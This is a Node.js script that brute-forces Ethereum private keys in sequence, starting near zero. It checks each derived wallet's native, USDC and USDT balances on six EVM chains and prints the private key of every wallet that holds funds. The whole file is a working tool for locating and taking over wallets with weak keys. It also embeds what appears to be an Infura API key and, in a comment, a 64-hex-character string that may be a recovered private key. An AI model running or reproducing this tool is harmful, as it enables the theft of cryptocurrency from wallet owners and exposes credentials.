const Wallet = require('ethereumjs-wallet').default
const { ethers: { JsonRpcProvider, Contract } } = require("ethers");
const erc20Abi = require('./ERC20.json')
// let privKey = '0000000000000000000000000000000000000000000000000000000000000000'
let chains = [
  "Ethereum",
  "Binance",
  "Polygon",
  "Avalanche",
  "Cronos",
  "Fantom"
]

let providers = [
  "https://mainnet.infura.io/v3/97ff5f037eb5411786571a94611dd0b8",
  "https://binance.llamarpc.com",
  "https://polygon-mainnet.infura.io/v3/97ff5f037eb5411786571a94611dd0b8",
  "https://avalanche-mainnet.infura.io/v3/97ff5f037eb5411786571a94611dd0b8",
  "https://evm.cronos.org",
  "https://rpcapi.fantom.network"
]

let usdtAddr = [
  "0xdAC17F958D2ee523a2206206994597C13D831ec7",
  "0x55d398326f99059ff775485246999027b3197955",
  "0xc2132d05d31c914a87c6611c10748aeb04b58e8f",
  "0xc7198437980c041c805a1edcba50c1ce5db95118",
  "0x66e428c3f67a68878562e79A0234c1F83c208770",
  "0x049d68029688eabf473097a2fc38ef61633a3c7a"
]

let usdcAddr = [
  "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48",
  "0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d",
  "0x3c499c542cef5e3811e1192ce70d8cc03d5c3359",
  "0xb97ef9ef8734c71904d8002f8b6bc66dd9c48a6e",
  "0xc21223249ca28397b4b6541dffaecc539bff0c59",
  "0x04068da6c83afcfa0e13ba15a6696662335d5b75"
]

const getPrivKeyString = privKey => {
  let res = ''
  for (let i = 0; i < 32; ++i) {
    res += Math.floor(Number(privKey[i] / 16)).toString(16)
    res += Number(privKey[i] % 16).toString(16)
  }
  return res
}

//searched until 00000001c00
//444691d194ba46883220a6a1c00188bcc5874c782172e748ac54a5a15291d400
const func = async () => {
  let privKey = Buffer.alloc(32, 0)
  // for (let i = 0; i < 32; ++i) {
  //   privKey[i] = Math.floor(Math.random() * 256);
  // }
  privKey[30] = 0x1c;
  console.log('Starting with ' + getPrivKeyString(privKey))
  while (1) {
    try {
      if (privKey[31] == 0 && privKey[30] % 4 == 0) {
        console.log('current privKey:', getPrivKeyString(privKey))
      }
      const wallet = Wallet.fromPrivateKey(privKey)
      const walletAddr = wallet.getAddressString()
      // console.log('privKey:', privKey)
      for (let i = 0; i < providers.length; ++i) {
        let loop = true
        while (loop) {
          try {
            // console.log('checking ' + chains[i])
            const provider = new JsonRpcProvider(providers[i]);
            const balance = await provider.getBalance(walletAddr)
            if (balance.toString().length > 16) {
              console.log('wallet:', walletAddr + " PrivKey:" + getPrivKeyString(privKey) + " Chain:" + chains[i] + " Balance:" + balance.toString())
            }
            const usdcContract = new Contract(usdcAddr[i], erc20Abi, provider)
            const usdcBalance = await usdcContract.balanceOf(walletAddr)
            if (usdcBalance.toString().length >= 17) {
              console.log('wallet:', walletAddr + " PrivKey:" + getPrivKeyString(privKey) + " Chain:" + chains[i] + " USDC " + usdcBalance.toString())
            }
            const usdtContract = new Contract(usdtAddr[i], erc20Abi, provider)
            const usdtBalance = await usdtContract.balanceOf(walletAddr)
            if (usdtBalance.toString() != '0') {
              console.log('wallet:', walletAddr + " PrivKey:" + getPrivKeyString(privKey) + " Chain:" + chains[i] + " USDT " + usdtBalance.toString())
            }
            loop = false
          } catch (ex) {
          }
          await wait(1000)
        }
      }
    } catch (err) {

    }
    let carry = 1, i = 31
    while (carry) {
      if (privKey[i] == 0xff) {
        privKey[i] = 0
      } else {
        ++privKey[i]
        carry = 0
      }
      --i
    }
  }
}

// console.log('ethers:', ethers)
func()